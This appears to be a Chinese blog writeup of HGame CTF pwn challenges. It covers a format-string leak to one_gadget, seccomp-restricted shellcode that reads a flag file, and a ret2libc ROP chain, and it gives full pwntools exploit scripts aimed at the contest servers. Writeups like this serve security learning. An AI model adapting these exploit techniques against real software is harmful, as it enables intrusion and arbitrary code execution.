---
title: HGame
categories: 
    - 比赛WriteUp
    - HGame
---


# week1
<!--more-->
## once(格式化字符串)


![20210306191440](https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png)


IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell

但是这不能⼀次就完成，要分两步，第⼀次利⽤要先 leak，覆盖返回地址，返回到漏洞开始的地⽅（这里就是程序的 vuln 函数），第⼆次就覆盖返回地址成 onegadget 即可

在第⼀步呢，有⼀个关键点，地址随机化的最低 12 bit，是不会变的，所以只要覆盖最低的 1 个字节，就可以返回到其它相近的地⽅，⽐如 vuln 函数的开头，


我用[tag]的方法找字符串的偏移老找不准：


![20210306191649](https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png)


如果想要找到栈中一些函数的地址来计算偏移的时候，不知道break在printf处后，栈中第一个值到底是第几个参数，所以我用了IDA去找。

test_exp:

```py
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
context.log_level = 'debug'

p = remote('127.0.0.1',12345)

payload = 'AAAA'  + '%1$p' +'%2$p' +  '%3$p' +'%4$p' +  '%5$p'    + '%6$p'  + '%13$p'  + '%14$p'

p.sendafter('It is your turn: ',payload)
```

![20210307140046](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png)



![20210307140246](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png)


可以看到第13个参数是一个 libc_start_main 的地址，利用这个地址与题目给的 libc 文件就可以计算出 onegadget 

最后的 getshell 中 +0x4f3d5 用 one_gadget [libcname] 指令

![20210308133927](https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png)

exp：

```py
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
context.log_level = 'info'

p = remote('182.92.108.71',30107)
#p = process('./once')
#p = remote('127.0.0.1',12345)

libc = ELF('./libc-2.27.so', checksec=False)
binary = ELF('./once', checksec=False)
payload = '%13$p\n'
payload = payload.ljust(0x28,'a')
payload +=   '\xD3' 
p.sendafter('It is your turn: ',payload)

libc_addr = p.recvuntil('\n','True')
libc_addr = int(libc_addr,16)
libc_base = libc_addr  - libc.symbols['__libc_start_main'] - 0xe7
print('libc_base',hex(libc_base))

getshell = 'a' *0x28
getshell += p64(libc_base + 0x4f3d5)

p.recvuntil('It is your turn: ')
p.sendline(getshell)

p.interactive()
```





## letter（没搞懂

![20210307191837](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307191837.png)

程序禁用了一些系统调用，导致无法直接用 shellcode 直接getshell ，即 asm(shellcraft.sh())，所以得手写汇编 shellcode；因为程序是64位的，所以要写 context.arch = 'amd64'


![20210307194929](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307194929.png)

负数溢出，但是没搞明白的是为什么是 -268376833 。。。。当事人非常郁闷

exp:

```py
from pwn import *
context.arch = 'amd64'
context.log_level='debug'
#r = process('./letter')
r=remote('182.92.108.71',31305)
r.sendlineafter('?','-268376833')
#r.sendline('a'*0x18+p64(0x60105c)+asm(shellcraft.sh()))
shellcode = '''
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c66
xor [rsp], rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
xor rax, rax
mov rdi, 3
mov rsi, 0x601070
mov rdx, 0x100
syscall
mov rax, 1
mov rdi, 1
mov rsi, 0x601070
mov rdx,0x100
syscall
'''
r.sendline('a'*0x18+p64(0x60108C)+asm(shellcode))
r.interactive()

```


发现其他师傅有另外的解法

exp：

```py
from pwn import*
context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./letter')
context.arch = elf.arch
def pr(a,addr):
	log.success(a+'====>'+hex(addr))
write_plt = elf.plt['write']
write_got = elf.got['write']
read_got = elf.got['read']
prdi = 0x400AA3
p6 = 0x400A9A
mmmc = 0x400A80
vuln = 0x400958
p = remote('182.92.108.71',31305)
#p = process('./letter')
#gdb.attach(p,'b *0x4009BB')
p.sendafter('?\n',str(0xffffffff).ljust(0x10,'\x00'))
payload = 'a'*0x18+p64(p6)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(write_got)+p64(8)
payload += p64(mmmc)+'a'*16+p64(0x00601000+0x500+0x10)+'a'*32+p64(0x4009DD)
p.send(payload)
p.recvuntil('.\n')
write_leak = u64(p.recv(8))
libcbase = write_leak - libc.sym['write']
open_addr = libcbase + libc.sym['open']
pr('libcbase',libcbase)

payload = 'a'*0x18+p64(0x00601000+0x500+0x10+0x10)+asm(shellcraft.open('flag'))
payload += asm(shellcraft.read(3,0x00601000+0x500+0x100,100))
payload += asm(shellcraft.write(1,0x00601000+0x500+0x100,100))
p.sendline(payload)

p.interactive()
```


搞不懂控制 rbp 为 0x00601000+0x500+0x10 是为什么。。。。




# week2

## rop_primary

![20210309195557](https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195557.png)

![20210309195620](https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195620.png)

![20210309195630](https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195630.png)

分析下来就是程序会给两个矩阵，我们要一个个输入两个矩阵相乘的结果来通过 check 函数，从而利用 vuln 去 rop


首先考的就是 python 功底，当然我是不太过关的。。。。

exp：

```py
def read_matrix():
	matrix = []
	while True:
		line = p.recvuntil('\n').strip()    
		if '\t' not in line:
			break
		row = []
		for num in line.split('\t'):
			row.append(int(num))
		print(line)
        matrix.append(row)
	return matrix

def multi_matrix(a, b):
	rows = len(a)
	mid = len(b)
	cols = len(b[0])
	result = []
	for i in range(rows):
		row = []
		for j in range(cols):
			num = 0
			for k in range(mid):
				num += a[i][k] * b[k][j]
			row.append(num)
		result.append(row)
	return result


p.recvuntil('A:\n')
a = read_matrix()
b = read_matrix()

result = multi_matrix(a, b)
```

之后就是简单的 rop 了

exp：

```py
from pwn import *
from LibcSearcher import *
#coding=utf-8
#context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
context.log_level = 'debug'

p = remote('159.75.104.107',30372)
#p = process('./rop_primary')


def read_matrix():
	matrix = []
	while True:
		line = p.recvuntil('\n').strip()    
		if '\t' not in line:
			break
		row = []
		for num in line.split('\t'):
			row.append(int(num))
		print(line)
        matrix.append(row)
	return matrix

def multi_matrix(a, b):
	rows = len(a)
	mid = len(b)
	cols = len(b[0])
	result = []
	for i in range(rows):
		row = []
		for j in range(cols):
			num = 0
			for k in range(mid):
				num += a[i][k] * b[k][j]
			row.append(num)
		result.append(row)
	return result


p.recvuntil('A:\n')
a = read_matrix()
b = read_matrix()

result = multi_matrix(a, b)

for row in result:
	for num in row:
		p.sendline(str(num))

elf = ELF('./rop_primary')
pus_got = elf.got['puts']
pus_plt = elf.plt['puts']

pop_rdi = 0x0000000000401613
pop_rsi_r15 = 0x0000000000401611
vuln_addr = 0x000000000040157B



payload = 'a'*0x38 + p64(pop_rdi) + p64(pus_got) + p64(pus_plt) + p64(vuln_addr)

p.sendline(payload)

p.recvuntil('try your best\n')

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))

print(hex(puts_addr))

offset = puts_addr -  	0x0875a0    
system_addr = offset + 0x055410   
bin_sh = offset + 	0x1b75aa        

ret_addr = 0x000000000040101a

payload = 'a'*0x38 + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)

p.sendline(payload)


p.interactive()

```




























